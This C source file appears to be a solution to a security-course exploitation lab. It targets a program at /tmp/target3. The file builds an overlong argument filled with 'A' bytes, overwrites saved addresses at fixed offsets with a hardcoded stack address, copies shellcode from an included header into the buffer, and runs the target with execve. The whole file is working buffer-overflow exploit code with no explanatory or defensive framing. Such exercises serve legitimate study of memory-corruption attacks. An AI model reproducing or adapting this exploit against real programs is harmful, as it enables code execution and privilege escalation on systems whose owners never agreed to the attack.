#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
	char arg1[136]; 
	char arg2[] = "0";
	char arg3[] = "37";
	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
	char *env[] = { NULL };

	memset(arg1, 'A', 136);
	int target = 0xbefffc98;
	*((int *) (arg1 + 132)) = target;
	*((int *) (arg1 + 12)) = target+16;
	memcpy(arg1+16, shellcode, strlen(shellcode));

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}